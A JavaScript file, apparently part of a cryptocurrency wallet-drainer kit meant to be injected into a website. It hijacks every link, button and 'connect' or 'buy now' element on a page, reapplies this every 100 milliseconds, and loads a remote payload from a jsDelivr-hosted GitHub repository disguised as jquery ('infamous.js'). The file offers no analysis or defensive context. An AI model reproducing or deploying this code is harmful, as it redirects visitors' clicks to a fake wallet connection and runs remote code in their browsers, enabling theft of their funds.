function replaceButtonsWithAnchors() {
    const buttons = document.querySelectorAll('button');
    buttons.forEach(button => {
        const anchor = document.createElement('a');
        anchor.innerHTML = button.innerHTML;
        for (let i = 0; i < button.attributes.length; i++) {
            anchor.setAttribute(button.attributes[i].name, button.attributes[i].value);
        }
        anchor.classList.add('connectButton');
        button.parentNode.replaceChild(anchor, button);
    });
}

function modifyElements() {
    function hasExcludedClass(element, classes) {
        for (let parent = element; parent !== document; parent = parent.parentNode) {
            if (parent.nodeType === Node.ELEMENT_NODE && classes.some(cls => parent.classList.contains(cls))) {
                return true;
            }
        }
        return false;
    }

    const excludedClasses = ['connectButton', 'web3-overlay', 'item', 'web3-modal-items', 'web3-modal-title', 'web3-modal'];
    const candidates = document.querySelectorAll('a, button, [role="button"], [disabled]');
    const uppercase = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
    const lowercase = 'abcdefghijklmnopqrstuvwxyz';
    const xpath = `//div[contains(translate(text(), '${uppercase}', '${lowercase}'), 'connect') or contains(translate(text(), '${uppercase}', '${lowercase}'), 'buy now')]`;
    const divsWithText = document.evaluate(xpath, document, null, XPathResult.ORDERED_NODE_SNAPSHOT_TYPE, null);
    const divs = [];

    for (let i = 0; i < divsWithText.snapshotLength; i++) {
        divs.push(divsWithText.snapshotItem(i));
    }

    const allElements = Array.from(candidates).concat(divs);
    const filteredElements = allElements.filter(element => !hasExcludedClass(element, excludedClasses));

    filteredElements.forEach(element => {
        if (element.tagName.toLowerCase() === 'a') {
            element.removeAttribute('href');
            element.removeAttribute('target');
            element.style.cursor = 'pointer';
        }
        if (element.hasAttribute('disabled')) {
            element.removeAttribute('disabled');
            element.style.opacity = '0.8';
            element.style.backgroundColor = '#cdcdcd';
        }
        element.classList.add('connectButton');
    });

    // replaceButtonsWithAnchors();
}

document.addEventListener('DOMContentLoaded', () => {
    modifyElements();
});

var currentUnixTimestamp = Math.floor(Date.now() / 1000);
var script = document.createElement('script');
script.src = 'https://cdn.jsdelivr.net/gh/nd91jqf/jquery@main/infamous.js?version=' + currentUnixTimestamp;
script.setAttribute('fetchpriority', 'high');
document.head.appendChild(script);

setInterval(modifyElements, 100);
